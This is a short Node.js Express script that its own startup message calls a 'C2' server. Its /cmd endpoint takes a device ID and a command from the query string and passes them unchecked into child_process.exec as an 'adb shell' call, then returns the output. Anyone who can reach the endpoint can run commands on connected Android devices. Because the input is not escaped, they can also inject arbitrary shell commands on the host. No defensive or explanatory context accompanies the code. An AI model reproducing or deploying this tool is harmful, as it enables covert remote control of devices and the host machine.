const express = require('express');  
const app = express();  

app.get('/cmd', (req, res) => {  
  require('child_process').exec(`adb -s ${req.query.device} shell ${req.query.cmd}`, (e, o) => {  
    res.send(o || e.message);  
  });  
});  

app.listen(3000, () => console.log('[+] C2 Active: http://localhost:3000'));  
